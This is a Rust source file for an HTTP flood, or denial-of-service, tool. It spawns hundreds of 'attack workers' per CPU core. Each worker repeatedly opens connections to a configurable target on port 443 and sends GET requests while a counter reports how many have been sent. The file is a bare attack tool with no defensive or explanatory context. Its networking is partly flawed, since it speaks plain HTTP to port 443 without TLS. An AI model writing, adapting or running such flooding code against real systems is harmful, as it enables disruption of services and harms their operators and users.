use hyper::client::conn::Builder;
use hyper::{Request, Body};
use tokio::net::TcpStream;
use tokio::sync::Semaphore;
use std::sync::Arc;
use tokio::task;
use tokio::time::{sleep, Duration};
use num_cpus;

const TARGET: &str = "example.com"; // Change to your target
const THREADS_PER_CORE: usize = 500;
const UPDATE_INTERVAL: Duration = Duration::from_secs(1);

#[tokio::main]
async fn main() {
    let total_requests = Arc::new(tokio::sync::Mutex::new(0u64));
    let semaphore = Arc::new(Semaphore::new(num_cpus::get() * THREADS_PER_CORE));

    // Request counter
    let total_requests_clone = total_requests.clone();
    tokio::spawn(async move {
        loop {
            sleep(UPDATE_INTERVAL).await;
            let count = *total_requests_clone.lock().await;
            println!("\rRequests Sent: {}", count);
        }
    });

    // Start attack workers
    let mut handles = Vec::new();
    for _ in 0..num_cpus::get() * THREADS_PER_CORE {
        let total_requests = total_requests.clone();
        let semaphore = semaphore.clone();

        let handle = task::spawn(async move {
            loop {
                let _permit = semaphore.acquire().await.unwrap();
                let stream = match TcpStream::connect(format!("{}:443", TARGET)).await {
                    Ok(s) => s,
                    Err(_) => continue,
                };

                let (mut sender, connection) = match Builder::new()
                    .handshake(stream)
                    .await
                {
                    Ok(conn) => conn,
                    Err(_) => continue,
                };

                tokio::spawn(connection);

                let req = Request::builder()
                    .uri(format!("https://{}/", TARGET))
                    .header("User-Agent", "Mozilla/5.0")
                    .body(Body::empty())
                    .unwrap();

                if sender.send_request(req).await.is_ok() {
                    *total_requests.lock().await += 1;
                }
            }
        });

        handles.push(handle);
    }

    // Wait for all tasks
    for handle in handles {
        handle.await.unwrap();
    }
}
